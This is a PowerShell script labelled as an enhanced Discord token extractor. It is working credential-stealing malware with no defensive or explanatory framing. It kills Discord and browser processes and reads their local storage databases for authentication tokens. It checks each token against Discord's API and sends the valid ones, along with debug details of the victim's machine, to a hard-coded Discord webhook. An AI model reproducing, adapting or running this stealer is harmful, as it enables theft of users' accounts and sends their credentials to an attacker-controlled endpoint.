# Discord Token Extractor - Enhanced Version
$webhook = "https://discord.com/api/webhooks/1462081265049010260/AdSpBnjtYKQFRI8lKt5oWg--qFCfwKF0b3q552oELMVzFxFDIdV0vUsGkEWWVSmuBLy0"
$baseUrl = "https://discord.com/api/v9/users/@me"
$regex = "[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
$regexEnc = "dQw4w9WgXcQ:[^`"]*"

# Force close all target processes
$processesToKill = @("Discord", "DiscordCanary", "discord", "chrome", "msedge", "brave", "opera", "firefox")
$killInfo = "Closing processes:`n"
foreach ($proc in $processesToKill) {
    try {
        $running = Get-Process $proc -ErrorAction SilentlyContinue
        if ($running) {
            Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
            $killInfo += "- $proc`: Killed $($running.Count) processes`n"
        } else {
            $killInfo += "- $proc`: Not running`n"
        }
    } catch {
        $killInfo += "- $proc`: Error killing process`n"
    }
}
Start-Sleep -Seconds 2
$body = @{content=$killInfo} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"

$paths = @{
    'Discord' = "$env:APPDATA\discord\Local Storage\leveldb\"
    'Discord Canary' = "$env:APPDATA\discordcanary\Local Storage\leveldb\"
    'Lightcord' = "$env:APPDATA\Lightcord\Local Storage\leveldb\"
    'Discord PTB' = "$env:APPDATA\discordptb\Local Storage\leveldb\"
    'Opera' = "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb\"
    'Opera GX' = "$env:APPDATA\Opera Software\Opera GX Stable\Local Storage\leveldb\"
    'Google Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb\"
    'Google Chrome1' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Storage\leveldb\"
    'Google Chrome2' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Storage\leveldb\"
    'Microsoft Edge' = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb\"
    'Brave' = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb\"
}

# Send debug info first
$debugInfo = "Searching for Discord tokens...`nPaths checked:`n"
foreach ($name in $paths.Keys) {
    $path = $paths[$name]
    $debugInfo += "- $name`: $path`n"
    if (Test-Path $path) {
        $files = Get-ChildItem $path -Filter "*.log","*.ldb" -ErrorAction SilentlyContinue
        $debugInfo += "  Found $($files.Count) files`n"
    } else {
        $debugInfo += "  Path not found`n"
    }
}
$body = @{content=$debugInfo} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"

$tokens = @()
$uids = @()

foreach ($name in $paths.Keys) {
    $path = $paths[$name]
    if (-not (Test-Path $path)) { continue }
    
    Get-ChildItem $path -Include "*.log","*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $content = Get-Content $_.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
            if ($content -and $content.Length -gt 0) {
                $matches = [regex]::Matches($content, $regex)
                foreach ($match in $matches) {
                    $token = $match.Value.Trim()
                    if ($token.Length -gt 50) {
                        try {
                            $response = Invoke-RestMethod -Uri $baseUrl -Headers @{"Authorization" = $token} -TimeoutSec 10 -ErrorAction Stop
                            $uid = $response.id
                            if ($uid -notin $uids) {
                                $tokens += $token
                                $uids += $uid
                            }
                        } catch { }
                    }
                }
            }
        } catch { }
    }
}

if ($tokens.Count -gt 0) {
    $tokenList = $tokens -join "`n"
    $body = @{content="Discord tokens found:`n$tokenList"} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
} else {
    $body = @{content="No Discord tokens found"} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
}
